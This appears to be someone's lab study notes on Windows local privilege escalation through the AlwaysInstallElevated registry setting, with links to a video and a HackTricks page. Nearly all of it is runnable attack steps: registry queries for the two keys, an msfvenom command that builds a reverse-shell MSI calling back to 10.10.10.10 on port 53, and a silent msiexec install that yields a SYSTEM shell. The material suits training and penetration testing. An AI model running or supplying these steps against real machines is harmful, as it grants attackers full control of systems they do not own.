[Windows Local Privilege Escalation - Registry (AlwaysInstallElevated) - YouTube](https://www.youtube.com/watch?v=9LpsofQN_ao&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=8)

[Domain Seizure](https://raidforums.com/misc.php?action=safelinks&url=https%3A%2F%2Fbook.hacktricks.xyz%2Fwindows%2Fwindows-local-privilege-escalation%23alwaysinstallelevated)



1. Query the registry for AlwaysInstallElevated keys:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> [!NOTE]
> Both keys are set to 1 (0x1).

2. On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

3. Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
4. Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```